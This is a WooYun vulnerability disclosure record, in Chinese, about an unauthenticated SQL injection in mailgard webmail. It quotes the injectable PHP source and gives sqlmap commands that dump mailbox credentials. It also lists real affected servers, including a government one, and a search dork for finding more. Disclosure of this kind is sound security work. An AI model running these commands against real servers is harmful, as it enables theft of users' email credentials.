{"id": 22155, "wybug_id": "wooyun-2015-098828", "wybug_title": "佑友mailgard webmail无需登录的SQL注射一枚", "wybug_corp": "深圳市河辰通讯技术有限公司", "wybug_author": "f4ckbaidu", "wybug_date": "2015-03-31 09:13", "wybug_open_date": "2015-07-02 16:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向公众公开  简要描述： 程序猿别怪我哦 详细说明：   WooYun: 佑友mailgard webmail命令执行之二 里提到，系统自带全局GPC过滤，会自动addslashes WooYun: 佑友mailgard webmail任意文件上传导致getshell（无需登录） 里提到，有几个越权访问的文件：\n./overflow_alarm.php./sms_send.php./src/old.rule.php./src/public_folders_upload.php./src/big_attach.php./src/big_att_upload.php./src/read_data.php./src/upload.php./sync/linkman.php\n./sync/linkman.php里面有明显的SQL注射（$group_id），代码如下由于没有包含global.php所以全局过滤无效并且不需要登录即可访问，如果未开启magic_quotes_gpc则可注入（系统默认关闭magic_quotes_gpc）\n<?phprequire_once 'conn.php';function outputUsers($export_range='', $group_id=0, $part=0){\tglobal $name,$msg;\tif($export_range == 'public'){\t\t$query = \" AND `group_remark`='public|'\";\t\t$query2 = \" AND `adscription`='public'\";\t}else{\t\t$query = \" AND `group_remark`='private|\".$name.\"'\";\t\t$query2 = \" AND `adscription`='\".$name.\"'\";\t}\t$sql = \"SELECT * FROM `groups` WHERE `fid`='\".$group_id.\"' \".$query;\t$res = mysql_query($sql);\twhile($rs = mysql_fetch_array($res)){\t\t\t\techo \"<group_$part><groupId>\".$rs['group_id'].\"</groupId><groupName>\".$rs['group_name'].\"</groupName>\";\t\t$sqlg = \"SELECT * FROM `groups` WHERE `fid`='\".$rs['group_id'].\"' \".$query;\t\t$resg = mysql_query($sqlg);\t\tif($rsg = mysql_fetch_array($resg)){\t\t\toutputUsers($export_range,$rs['group_id'],$part+1);\t\t}\t\t// 列出此组下联系人\t\t$sqll = \"SELECT * FROM `linkman` WHERE `group_id`='\".$rs['group_id'].\"' $query2 ORDER BY convert(`name` using GBK) \";\t\t$resl = mysql_query($sqll);\t\twhile ($rsl=mysql_fetch_array ($resl)) {\t\t\techo \"<linkman>\t\t\t\t<email>\".$rsl['mail_addr'].\"</email>\t\t\t\t<name>\".$rsl['name'].\"</name>\t\t\t\t</linkman>\";\t\t}\t\techo \"</group_$part>\";\t}}$group_id = $_POST['group_id'] ? $_POST['group_id'] : $_GET['group_id'];$export_range = $_POST['export_range'] ? $_POST['export_range'] : $_GET['export_range'];echo '<'.'?xml version=\"1.0\" encoding=\"utf-8\"?'.'>';echo '<hechen>';echo '<public>';outputUsers('public');echo '</public>';echo '<private>';outputUsers();echo '</private>';echo '</hechen>';?>\n看下它包含的conn.php代码，注入一样很明显（$name和$token）由于没有包含global.php所以全局过滤无效并且不需要登录即可访问，如果未开启magic_quotes_gpc则可注入（系统默认关闭magic_quotes_gpc）\n<?phpheader('Content-type: text/xml');error_reporting(0);ini_set(\"display_errors\", \"0\");$dbserver = 'localhost';$dbuser = 'syssql';$dbuserpw = 'h*****8';$msg = '';$link = mysql_connect($dbserver,$dbuser,$dbuserpw) or setError('Cannot connect to the DB');mysql_select_db('hicommail',$link) or setError('Cannot select the DB');mysql_query(\"set names utf8\");$name = $_POST['name'] ? $_POST['name'] : $_GET['name'];$token = $_POST['token'] ? $_POST['token'] : $_GET['token'];if(!$name || !$token){\tsetError(\"Token can't be empty\");}else{\t$sql = \"SELECT * FROM `mailbox` WHERE `username` = '\".$name.\"'\";\t$result = mysql_query($sql,$link);\t$row = mysql_fetch_assoc($result);\tif(!$row['password']){\t\tsetError('Token does not exist');\t}elseif($row['active']==\"0\"){\t\tsetError('This account has been frozen');\t}else{\t\t$sql = \"SELECT * FROM `define_para` WHERE `user_name`='$name' \";\t\t$result = mysql_query($sql);\t\tif($rs = mysql_fetch_array($result)) {\t\t\tif(time()-$rs['trydate']<120 && $rs['trytimes']>=3) {\t\t\t\tmysql_query(\"UPDATE `define_para` SET `trydate`=\".time().\" WHERE `user_name`='$name'  \");\t\t\t\tsetError('Try too frequently, please try again after two minutes');\t\t\t}else{\t\t\t\tif($row['password'] != crypt($token,$row[\"password\"])){\t\t\t\t\t$sql = \"SELECT * FROM `define_para` WHERE `user_name`='$name' \";\t\t\t\t\t$result = mysql_query($sql);\t\t\t\t\tif($rs = mysql_fetch_array($result)) {\t\t\t\t\t\tif(time()-$rs['trydate']<120) {\t\t\t\t\t\t\t$rs['trytimes']++;\t\t\t\t\t\t\tmysql_query(\"UPDATE `define_para` SET `trytimes`=`trytimes`+1 WHERE `user_name`='$name'  \");\t\t\t\t\t\t}else{\t\t\t\t\t\t\t$rs['trytimes'] = 1;\t\t\t\t\t\t\tmysql_query(\"UPDATE `define_para` SET `trydate`='\".time().\"',`trytimes`=1 WHERE `user_name`='$name'  \");\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t\tif( (3-$rs['trytimes'])>0 ){\t\t\t\t\t\tsetError(sprintf('Login fails, you can try %d times', (3-$rs['trytimes'])));\t\t\t\t\t}else{\t\t\t\t\t\tsetError('Try too frequently, please try again after two minutes');\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}\t}}function setError($msg){\techo '<'.'?xml version=\"1.0\" encoding=\"utf-8\"?'.'>';\techo \"<error>$msg</error>\";\texit;}?>\n系统的逻辑是先运行conn.php的代码校验身份，再运行linkman.php的代码所以我们要搞注入，得从conn.php入手上sqlmap：\nsqlmap -u \"http://mail.domain.com:889/sync/conn.php?name=admin' or '1'='1 *&token=1\" --dbms=mysql --technique=B --dbs --threads=5\n邮箱帐号密码在hicommail.mailbox里，sqlmap可直接dump：\nsqlmap -u \"http://mail.domain.com:889/sync/conn.php?name=admin' or '1'='1 *&token=1\" --dbms=mysql --technique=B --threads=5 -D hicommail -T mailbox -C username,password --dump\n\n\n密码加密类型为php crypt($password,$md5salt)，例如$1$08ab2d3c$G1Q/PyedrHxQdfGXOmga0/，这种类型爆破需要时间不过另外有个表（hicommail.popmanage）保存了少量POP3明文密码，base64编码的，在这里为了保护用户就不贴出来了   漏洞证明：  百度搜索intitle:\"mailgard webmail\"，测试了一下基本上都中招案例1：http://mail.iconergy.com:889/\n\n案例2：http://mail.csgholding.com:889/（南玻）\n\n案例3：http://www.gtc.com.cn:889/\n\n来个gov的，案例4：http://email.szns.gov.cn:889/\n\n案例5：http://mail.gcredit.cn:889/\n\n   修复方案：     版权声明：转载请注明来源 f4ckbaidu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-04-03 16:17 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-02 21:40 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  洞主很耐心啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}